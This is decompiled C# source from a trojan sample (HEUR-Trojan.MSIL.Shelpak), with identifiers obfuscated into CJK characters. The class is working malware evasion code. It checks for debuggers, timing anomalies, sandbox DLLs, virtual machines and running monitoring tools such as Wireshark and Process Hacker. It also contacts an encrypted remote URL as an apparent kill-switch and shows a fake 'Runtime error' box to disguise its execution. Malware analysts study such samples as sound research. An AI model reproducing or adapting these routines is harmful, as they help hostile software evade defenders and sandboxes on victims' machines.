// Decompiled with JetBrains decompiler
// Type: 爻飛子豸玉止欠爻片丿石殳爻彐.夂穴皮里生艮爿襾骨殳冖斗
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace 爻飛子豸玉止欠爻片丿石殳爻彐
{
  internal sealed class 夂穴皮里生艮爿襾骨殳冖斗
  {
    [DllImport("kernel32.dll", EntryPoint = "CheckRemoteDebuggerPresent", SetLastError = true)]
    private static extern bool 隶十行冂夕山生用又辰彐爪(IntPtr 豆音竹文无匕夂阜臼廴歹冫貝革女, ref bool 牙彡彡艸斤香月立文彳手网曰);

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle")]
    private static extern IntPtr 辵龠見宀鬲又田比手入夕虍羽(string 示用虫日冂耒生鼠甘生雨力貝匚斗亠凵);

    private static bool 己儿廴心寸歹夂臼角毋隹口爿山()
    {
      bool 牙彡彡艸斤香月立文彳手网曰 = false;
      try
      {
        夂穴皮里生艮爿襾骨殳冖斗.隶十行冂夕山生用又辰彐爪(Process.GetCurrentProcess().Handle, ref 牙彡彡艸斤香月立文彳手网曰);
        return 牙彡彡艸斤香月立文彳手网曰;
      }
      catch
      {
      }
      return 牙彡彡艸斤香月立文彳手网曰;
    }

    private static bool 戶冂夕皿月歹辵彐玄广土屮()
    {
      try
      {
        long ticks = DateTime.Now.Ticks;
        Thread.Sleep(10);
        if (DateTime.Now.Ticks - ticks < 10L)
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool 儿寸爻皮水歹丶隶田十几凵牙()
    {
      try
      {
        return new WebClient().DownloadString(子片爿音文糸刀女谷彐尸斗女土冫.方寸黍女口而廴巾長音皮子(new byte[48]
        {
          (byte) 150,
          (byte) 74,
          (byte) 225,
          (byte) 199,
          (byte) 246,
          (byte) 42,
          (byte) 22,
          (byte) 12,
          (byte) 92,
          (byte) 2,
          (byte) 165,
          (byte) 125,
          (byte) 115,
          (byte) 20,
          (byte) 210,
          (byte) 212,
          (byte) 231,
          (byte) 87,
          (byte) 111,
          (byte) 21,
          (byte) 89,
          (byte) 98,
          (byte) 65,
          (byte) 247,
          (byte) 202,
          (byte) 71,
          (byte) 238,
          (byte) 24,
          (byte) 143,
          (byte) 201,
          (byte) 231,
          (byte) 207,
          (byte) 181,
          (byte) 18,
          (byte) 199,
          (byte) 100,
          (byte) 99,
          (byte) 153,
          (byte) 55,
          (byte) 114,
          (byte) 55,
          (byte) 39,
          (byte) 135,
          (byte) 191,
          (byte) 144,
          (byte) 26,
          (byte) 106,
          (byte) 93
        })).Contains("true");
      }
      catch
      {
      }
      return false;
    }

    private static bool 爪力老鹿曰大冂宀气文勹黃女心心()
    {
      Process[] processes = Process.GetProcesses();
      string[] source = new string[8]
      {
        "processhacker",
        "netstat",
        "netmon",
        "tcpview",
        "wireshark",
        "filemon",
        "regmon",
        "cain"
      };
      foreach (Process process in processes)
      {
        if (((IEnumerable<string>) source).Contains<string>(process.ProcessName.ToLower()))
          return true;
      }
      return false;
    }

    private static bool 片厶彐鬼厶弋彡工龍艸尸冫()
    {
      string[] strArray = new string[5]
      {
        "SbieDll.dll",
        "SxIn.dll",
        "Sf2.dll",
        "snxhk.dll",
        "cmdvrt32.dll"
      };
      foreach (string 示用虫日冂耒生鼠甘生雨力貝匚斗亠凵 in strArray)
      {
        if (夂穴皮里生艮爿襾骨殳冖斗.辵龠見宀鬲又田比手入夕虍羽(示用虫日冂耒生鼠甘生雨力貝匚斗亠凵).ToInt32() != 0)
          return true;
      }
      return false;
    }

    private static bool 彐酉屮風父网血香止辰()
    {
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
      {
        try
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              if (managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL") || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
                return true;
            }
          }
        }
        catch
        {
          return true;
        }
      }
      foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
      {
        if (managementBaseObject.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject.GetPropertyValue("Name").ToString().Contains("VBox"))
          return true;
      }
      return false;
    }

    public static void 冫水爪身廴火雨夂止足卩()
    {
      int num = (int) MessageBox.Show("Exit code " + ("0x" + 子片爿音文糸刀女谷彐尸斗女土冫.衣非水鳥十用石用馬火鬼皿气匕("1").Substring(0, 5)), "Runtime error", MessageBoxButtons.RetryCancel, MessageBoxIcon.Hand);
      玉凵鼎矛宀田殳彳弓片无衣夊斗.父土弋己老殳矢儿父入几牙舟();
    }
  }
}
